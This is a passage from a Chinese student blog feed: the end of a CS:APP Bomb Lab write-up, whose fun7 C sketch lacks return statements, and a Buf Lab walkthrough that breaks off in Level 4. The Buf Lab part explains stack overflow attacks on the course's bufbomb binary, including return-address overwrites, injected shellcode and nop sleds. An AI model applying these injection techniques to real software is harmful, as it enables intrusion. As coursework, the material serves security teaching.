<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span> *address, <span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (address == null)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span> (*address &lt;= number) &#123;</span><br><span class="line">		<span class="keyword">if</span> (*address == number )</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="number">2</span> * fun7(*(address + <span class="number">8</span>), number) + <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="number">2</span> * fun7(*(address + <span class="number">4</span>), number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>因为返回值要为5，推导：0-&gt;1-&gt;2-&gt;5，所以地址变化：加8、加4、加8，依次查看，答案是<code>0x2f=47</code><br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210503163503472.png" alt="image-20210503163503472"></p>
</li>
<li><p>这个过程其实是：36&lt;=47地址加8，50&gt;47小地址加4，45&lt;=47地址加8，47=47返回值为0<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210503181401052.png" alt="image-20210503181401052"></p>
</li>
<li><p>完成验证<br><img src="/2021/05/13/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-3_BombLab/image-20210503160027467.png" alt="image-20210503160027467"></p>
</li>
</ul>
<h2 id="第一次总结"><a href="#第一次总结" class="headerlink" title="第一次总结"></a>第一次总结</h2><p><code>bomb lab</code>这个实验让我对<code>gdb</code>调试更加熟悉，对于汇编代码不至于每一个都要去查，这实验还是很有用处的。</p>
<p>问题总是出现在函数的参数、各种跳转上，其实还是对寄存器、内存地址以及栈帧的认识不够，还需继续努力。</p>
<p>第一次做的时候连栈帧图都不会画，所以不仅做得效率低下而且也不太明白。</p>
<p><strong>为了更加好看，正在对过程的重写中。。。。</strong></p>
<h2 id="第二次总结"><a href="#第二次总结" class="headerlink" title="第二次总结"></a>第二次总结</h2><p>即将进行实验验收，今天终于完成了对炸弹实验过程的重写。</p>
<p>这个过程之所以写的这么详细，不只是过关，其实也是为了加强自己对汇编代码的阅读和理解能力。</p>
<p>总之，这个实验花了很久的时间，同样也收获了很多。</p>
<p><strong>完结撒花！</strong></p>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
        <tag>LAB</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统——LAB-4_BufLab</title>
    <url>/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/</url>
    <content><![CDATA[<h1 id="深入理解计算机系统——LAB-4-Buf-Lab"><a href="#深入理解计算机系统——LAB-4-Buf-Lab" class="headerlink" title="深入理解计算机系统——LAB-4_Buf_Lab"></a>深入理解计算机系统——LAB-4_Buf_Lab</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>缓冲区溢出实验。</strong></p>
<p>要求学生们通过利用一个<strong>缓冲区溢出漏洞</strong>，来<strong>修改</strong>一个<strong>二进制可执行文件的运行时行为</strong>。</p>
<p>这个实验教会学生们<strong>栈的原理</strong>，并让他们了解到写那种<strong>易于遭受缓冲区溢出攻击的代码</strong>的<strong>危险性</strong>。</p>
<h2 id="实验环境和使用工具"><a href="#实验环境和使用工具" class="headerlink" title="实验环境和使用工具"></a>实验环境和使用工具</h2><ul>
<li><p>主系统 <code>Windows10</code></p>
</li>
<li><p>子系统 <code>Windows Subsystem for Linux kali</code></p>
</li>
<li><p><code>gdb10.2.1</code>版本</p>
</li>
<li><p><code>objdump 2.35.2</code>版本</p>
</li>
<li><p><code>VS code</code>编辑器，下载了<code>x86 and x86_64 Assembly</code>插件，提供汇编代码高亮功能</p>
</li>
</ul>
<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="准备过程，查看buflab-writeup-pdf"><a href="#准备过程，查看buflab-writeup-pdf" class="headerlink" title="准备过程，查看buflab-writeup.pdf"></a>准备过程，查看<code>buflab-writeup.pdf</code></h3><p>一共有三个二进制<strong>可执行文件：</strong></p>
<ul>
<li><p><code>bufbomb</code>：你将攻击的缓冲区炸弹程序</p>
<ul>
<li><p>通过<code>int getbuf()</code>函数从输入中读取字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbuf */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getbuf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>容量为32字符的<code>buf</code>字符数组</li>
<li>其中调用<code>Gets(buf)</code>读取字符串（以<code>\n</code>或文件结束符作为终止符），并将其连同终止符存储到一个目标地址（<code>buf</code>数组中）</li>
<li>如果字符串长度&lt;=31个字符则正常返回1，反之则返回错误</li>
</ul>
</li>
<li><p><code>bufbomb</code>有几个命令行参数：</p>
<ul>
<li><code>-u userid</code>为指定的userid操作炸弹</li>
<li><code>-h</code>打印命令行参数列表</li>
<li><code>-n</code>在”Nitro”模式下操作，在Level 4中使用。</li>
<li><code>-s</code>将解决方案提交给评分服务器</li>
</ul>
</li>
</ul>
</li>
<li><p><code>makecookie</code>：根据userid（用户id）生成一个“cookie”</p>
<ul>
<li><p>用法示例：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; ./makecookie bovik</span><br><span class="line"><span class="number">0x1005b2b7</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>cookie是由8个十六进制数字组成的字符串，不出意外与userid一一对应</p>
</li>
<li><p>在五次缓冲区攻击中的四次攻击中，我们的目标是将cookie放在他一般不该出现的地方。</p>
</li>
</ul>
</li>
<li><p><code>hex2raw</code>：一个帮助在字符串格式之间进行转换的程序</p>
<ul>
<li><p>输入两个一组的16进制数字以空格或者换行符分隔，也就是16进制格式的exploit string，转换为ASCII码格式字符串。支持c语言风格的注释</p>
</li>
<li><p>你能通过设置一系列管道去通过<code>hex2raw</code>传递字符串：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; cat exploit.txt | ./hex2raw | ./bufbomb -u bovik</span><br></pre></td></tr></table></figure></li>
<li><p>你能存储原始字符串在一个文件，然后通过使用I/O重定向去提交给<code>bufbomb</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span><br><span class="line">unix&gt; ./bufbomb -u bovik &lt; exploit-raw.txt</span><br></pre></td></tr></table></figure>

<p>在GDB调试内部也能使用这种方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unix&gt; <span class="function">gdb <span class="title">bufbomb</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span> run -u bovik &lt; exploit-raw.txt</span></span><br></pre></td></tr></table></figure></li>
<li><p>注意</p>
<ul>
<li><code>0x0A</code>是换行符<code>\n</code>，它会终止字符串读取，所以不能包含<code>0x0A</code>。</li>
<li>如果要创建字符串<code>0xDEADBEEF</code>，我们应该传递<code>EF BE AD DE</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>接下来是五个Level的说明</p>
<h3 id="Level-0-Candle-10-pts"><a href="#Level-0-Candle-10-pts" class="headerlink" title="Level 0: Candle(10 pts)"></a>Level 0: Candle(10 pts)</h3><h4 id="Level-0说明："><a href="#Level-0说明：" class="headerlink" title="Level 0说明："></a>Level 0说明：</h4><p><code>getbuf</code>函数被<code>test</code>函数调用，<code>test</code>函数C语言代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="comment">/* Put canary on stack to detect possible corruption */</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> local = uniqueval();</span><br><span class="line"></span><br><span class="line">	val = getbuf();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">	<span class="keyword">if</span> (local != uniqueval()) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用顺序是<code>test()-&gt;getbuf()-&gt;test()</code>，我们的任务是将其改变为<code>test()-&gt;getbuf()-&gt;smoke()</code>，<code>smoke()</code>函数代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Smoke!: You called smoke()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作者给出的一些建议：</p>
<ul>
<li>为这个级别设计你的exploit string。你需要的所有信息都可以通过检查<code>BUFBOMB</code>的反汇编版本来确定。使用<code>objdump -d</code>获取其反汇编版本。</li>
<li>注意字节顺序。</li>
<li>可以用GDB去逐步执行最后<code>getbuf</code>最后几条指令，确保程序正在做正确的事情。</li>
<li><code>buf</code>数组在<code>getbuf</code>栈帧中的位置取决于被用来去编译<code>bufbomb</code>程序的gcc的版本，因此我们必须去阅读一些汇编代码来确定它的真正位置</li>
</ul>
<h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><p>反汇编<code>bufbomb</code>程序得到其反汇编版本<code>bufbomb.asm</code></p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603102948513.png" alt="image-20210603102948513"></p>
<p>查看<code>getbuf</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08049262 &lt;getbuf&gt;:</span><br><span class="line"> 8049262:	55                   	push   %ebp</span><br><span class="line"> 8049263:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8049265:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8049268:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line"> 804926b:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 804926e:	e8 bf f9 ff ff       	call   8048c32 &lt;Gets&gt;</span><br><span class="line"> 8049273:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 8049278:	c9                   	leave  </span><br><span class="line"> 8049279:	c3                   	ret    </span><br><span class="line"> 804927a:	90                   	nop</span><br><span class="line"> 804927b:	90                   	nop</span><br><span class="line"> 804927c:	90                   	nop</span><br><span class="line"> 804927d:	90                   	nop</span><br><span class="line"> 804927e:	90                   	nop</span><br><span class="line"> 804927f:	90                   	nop</span><br></pre></td></tr></table></figure>

<p>我们可以看出<code>Gets</code>函数的参数，也就是<code>buf</code>数组的首地址是<code>ebp-0x28</code></p>
<ul>
<li>因为<code>0x28=40</code>，所以我们需要先存入40个字符到栈帧中去占用给临时变量预留的空间</li>
<li>然后再存入4个字符去占用本该是旧的esp存的空间，</li>
<li>最后构造4个字符去作为返回地址将返回地址修改为<code>smoke</code>函数的地址<code>0x08048e0a</code>，按照小端法排列。</li>
</ul>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603121223800.png" alt="image-20210603121223800"></p>
<ul>
<li>因为<code>0x0A</code>不能出现，所以我们修改成<code>0x0B</code>，同样能满足要求。</li>
<li>最后得到的exploit string如图所示<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603174115683.png" alt="image-20210603174115683"></li>
<li>验证，与预期结果符合，Level 0完成。<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603192226913.png" alt="image-20210603192226913"></li>
</ul>
<h3 id="Level-1-Sparkler-10-pts"><a href="#Level-1-Sparkler-10-pts" class="headerlink" title="Level 1: Sparkler(10 pts)"></a>Level 1: Sparkler(10 pts)</h3><h4 id="Level-1说明："><a href="#Level-1说明：" class="headerlink" title="Level 1说明："></a>Level 1说明：</h4><p><code>bufbomb</code>文件有一个函数<code>fizz</code>，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">1</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与Level 0相似，我们的任务是让<code>bufbomb</code>去执行<code>fizz</code>函数而不是<code>test</code>函数</p>
<p>不同的是，我们要给函数<code>fizz</code>传入一个参数<code>val</code>，这个参数<code>val</code>要等于userid对应的cookie。</p>
<p>作者的建议：函数不会调用<code>fizz</code>函数，它只会执行它的代码。这对于我们想在栈帧中放置cookie的位置有提示。</p>
<h4 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h4><ul>
<li>查看<code>bufbomb</code>的汇编代码，<code>fizz</code>函数的地址是<code>0x08048daf</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603203218420.png" alt="image-20210603203218420"></li>
<li>userid为07的cookie是<code>0x429c4151</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603204916203.png" alt="image-20210603204916203"></li>
<li>将这两个写入Level 1的exploit string，中间的是一个无关4字节（<code>fizz</code>函数把它当做返回地址），结果如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603213910804.png" alt="image-20210603213910804"></li>
<li>验证，符合预期结果，Level 1完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210603213409034.png" alt="image-20210603213409034"></li>
</ul>
<h3 id="Level-2-Firecracker-15-pts"><a href="#Level-2-Firecracker-15-pts" class="headerlink" title="Level 2: Firecracker(15 pts)"></a>Level 2: Firecracker(15 pts)</h3><h4 id="Level-2说明："><a href="#Level-2说明：" class="headerlink" title="Level 2说明："></a>Level 2说明：</h4><p><code>bufbomb</code>文件有一个函数<code>bang</code>，代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (global_value == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与Level 0和Level 1类似，我们的任务是让<code>bufbomb</code>执行<code>bang</code>函数。</p>
<p>不同的是，我们要将全局变量<code>global_value</code>设置成userid对应的cookie</p>
<p>作者给出的建议：</p>
<ul>
<li>你可以通过GDB来获取信息来构造你的exploit string</li>
<li>手工确定指令序列的字节编码非常繁琐易错，我们通过编写包含想要放入栈中的指令和数据的汇编代码让工具去做所有的工作。</li>
<li>exploit string取决于自己的机器、自己的编译器以及cookie</li>
<li>不要试图使用jmp或call指令去跳转到<code>bang</code>的地址，因为这些指令使用相对PC寻址，很难设置正确。因此需要将地址压入栈中。</li>
</ul>
<h4 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h4><ul>
<li><p>查看<code>bufbomb</code>的汇编代码，<code>bang</code>函数的地址是<code>0x08048d52</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604100834183.png" alt="image-20210604100834183"></p>
</li>
<li><p>查看<code>bang</code>的汇编代码，找到<code>global_value</code>的地址<code>0x804d10c</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604141946443.png" alt="image-20210604141946443"></p>
</li>
<li><p>要将<code>global_value</code>的值设置成cookie然后再执行<code>bang</code>函数，我们编写如下汇编代码去实现它<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604142631247.png" alt="image-20210604142631247"></p>
</li>
<li><p>因为不能直接传入汇编代码，我们用gcc得到对应的二进制文件，objdump反汇编得到它的机器码<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604142605461.png" alt="image-20210604142605461"></p>
</li>
<li><p>为了执行这些代码，我们需要知道<code>buf</code>数组的首地址，也就是<code>getbuf</code>函数里的<code>ebp-0x28</code>，使用GDB得到这个地址为<code>0x55682fb8</code></p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604151933110.png" alt="image-20210604151933110"></p>
</li>
<li><p>所以构造exploit string如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604152555659.png" alt="image-20210604152555659"></p>
</li>
<li><p>验证，符合预期结果，Level 2完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604152527883.png" alt="image-20210604152527883"></p>
</li>
</ul>
<h3 id="Level-3-Dynamite-20-pts"><a href="#Level-3-Dynamite-20-pts" class="headerlink" title="Level 3: Dynamite(20 pts)"></a>Level 3: Dynamite(20 pts)</h3><h4 id="Level-3说明："><a href="#Level-3说明：" class="headerlink" title="Level 3说明："></a>Level 3说明：</h4><p>我们之前的攻击都导致程序跳转到其他函数的代码，然后导致程序退出。因此，使用破坏堆栈的exploit string来覆盖保存的值是可以接受的。</p>
<p>最复杂形式的缓冲区溢出攻击会导致程序执行一些漏洞利用代码，这些代码会改变程序的寄存器/内存状态，但会使程序返回到原始调用函数(本例中为<code>test</code>)。调用函数对攻击视而不见。不过，这种攻击方式很棘手，因为您必须:1)将机器代码放到堆栈上，2)将返回指针设置到该代码的开头，3)撤销对堆栈状态的任何破坏。</p>
<p>您在这个级别的任务是提供一个exploit string，它将导致<code>getbuf</code>返回您的cookie进行测试，而不是值1。您可以在测试代码中看到，完成的话将导致程序成功运行“Bomb！”。您的漏洞代码应该将您的cookie设置为<code>getbuf</code>返回值，恢复任何损坏的状态，在堆栈上压入正确的返回位置，并执行<code>ret</code>指令以真正返回到<code>test</code>。</p>
<p>作者的建议：</p>
<ul>
<li>您可以使用GDB获得构建漏洞字符串所需的信息。在<code>getbuf</code>中设置一个断点并运行到该断点。确定参数，如保存的返回地址。</li>
<li>手工确定指令的机器码既繁琐又容易出错。您可以通过编写包含要放入堆栈的指令和数据的汇编代码文件，让工具来完成所有的工作。用GCC汇编这个文件，用OBJDUMP拆解。您应该能够获得您将在提示符下键入的确切字节序列。</li>
<li>请记住，您的exploit string取决于您的机器、编译器，甚至您的userid的cookie。</li>
</ul>
<p>一旦你完成了这一关，停下来反思一下你已经完成了什么。你让一个程序执行你自己设计的机器代码。你这样做的方式足够隐秘，以至于程序没有意识到有什么不对劲。</p>
<h4 id="题解：-3"><a href="#题解：-3" class="headerlink" title="题解："></a>题解：</h4><ul>
<li><p>我们这一Level的思路是：因为<code>getbuf</code>的返回值保存在eax里，然后赋给<code>val</code>，所以我们只需要执行构造的代码将eax里面的值修改为cookie，同时将赋值指令的地址压入栈中，然后用ret指令返回地址，正常去执行<code>test</code>的剩余指令。</p>
</li>
<li><p>查看<code>test</code>的汇编代码，将<code>getbuf</code>返回值赋给<code>val</code>的指令的地址是<code>0x8048e50</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604171307444.png" alt="image-20210604171307444"></p>
</li>
<li><p>编写汇编代码实现改写eax的值、压入地址、返回地址，如图所示：</p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604172403658.png" alt="image-20210604172403658"></p>
</li>
<li><p>gcc编译成可重定位目标文件，objdump查看机器码<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604174037448.png" alt="image-20210604174037448"></p>
</li>
<li><p>为了还原栈，查看调用<code>getbuf</code>时的旧的ebp<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604181743588.png" alt="image-20210604181743588"></p>
</li>
<li><p>构造exploit string，如图所示：<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604184022787.png" alt="image-20210604184022787"></p>
</li>
<li><p>验证，预期结果符合，Level 3完成<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604184002866.png" alt="image-20210604184002866"></p>
</li>
</ul>
<h3 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin(10 pts)"></a>Level 4: Nitroglycerin(10 pts)</h3><h4 id="Level-4说明："><a href="#Level-4说明：" class="headerlink" title="Level 4说明："></a>Level 4说明：</h4><p>请注意：您需要使用“-n”命令行选项来运行这关。</p>
<p>从一次运行到另一次运行，尤其是由不同的用户运行，给定过程使用的确切堆栈位置会有所不同。这种变化的一个原因是，当程序开始执行时，所有环境变量的值都放在堆栈底部附近。环境变量存储为字符串，根据它们的值需要不同的存储量。因此，为给定用户分配的堆栈空间取决于他或她的环境变量的设置。在GDB下运行程序时，栈的位置也不同，因为GDB为自己的一些状态使用栈空间</p>
<p>在调用getbuf的代码中，我们加入了稳定堆栈的特性，因此getbuf的堆栈框架的位置在两次运行之间是一致的。这使得您可以在知道<code>buf</code>的确切起始地址的情况下编写一个攻击字符串。如果你试图在一个正常的程序上使用这样的漏洞，你会发现它有时会起作用，但在其他时候会导致分段错误。因此得名“炸药”——阿尔弗雷德·诺贝尔开发的一种炸药，含有稳定元素，使其不太容易发生意外爆炸。</p>
<p>对于这个级别，我们走了相反的方向，使堆栈位置比平时更不稳定。因此得名“硝化甘油”——一种出了名的不稳定炸药</p>
<p>当你用命令行标志“-n”运行<code>BUFFAMBOM</code>时，它将在“硝基”模式下运行。该程序不是调用函数<code>getbuf</code>，而是调用一个略有不同的函数<code>getbufn</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Buffer size for getbufn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KABOOM_BUFFER_SIZE 512</span></span><br></pre></td></tr></table></figure>

<p>这个函数类似于<code>getbuf</code>，只是它有一个512个字符的缓冲区。您将需要这个额外的空间来创建一个可靠的漏洞。调用<code>getbufn</code>的代码首先在堆栈上分配一个随机的存储量，这样，如果您在<code>getbufn</code>的两次连续执行期间对%ebp的值进行采样，您会发现它们相差多达240。</p>
<p>此外，当在硝基模式下运行时，BUFBOMB要求您提供您的字符串5次，它将执行<code>getbufn</code>5次，每次都有不同的堆栈偏移量。您的利用字符串必须使它每次都返回您的cookie。</p>
<p>您的任务与Level 3级别的任务相同。同样，您在这个级别的工作是提供一个漏洞利用字符串，它将导致<code>getbufn</code>返回您的cookie进行测试，而不是值1。您可以在测试代码中看到，这将导致程序运行“KABOOM！”您的漏洞代码应该将您的cookie设置为返回值，恢复任何损坏的状态，在堆栈上推送正确的返回位置，并执行ret指令以真正返回testn。</p>
<p>作者建议：</p>
<ul>
<li>您可以使用HEX2RAW程序发送漏洞字符串的多个副本。如果文件exploit.txt中只有一个副本，则可以使用以下命令:<br><code>unix&gt; cat exploit.txt | ./hex2raw -n | ./bufbomb -n -u bovik</code></li>
<li>诀窍是利用nop指令。它用一个字节(代码0x90)编码。在CS:APP2e教材的第262页上阅读关于“nop sleds”的内容可能会有所帮助</li>
</ul>
<h4 id="题解：-4"><a href="#题解：-4" class="headerlink" title="题解："></a>题解：</h4><ul>
<li><p>查看<code>getbufn</code>函数的汇编代码，缓冲区首地址为<code>ebp-0x208</code><br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94LAB-4_BufLab/image-20210604200855918.png" alt="image-20210604200855918"></p>
</li>
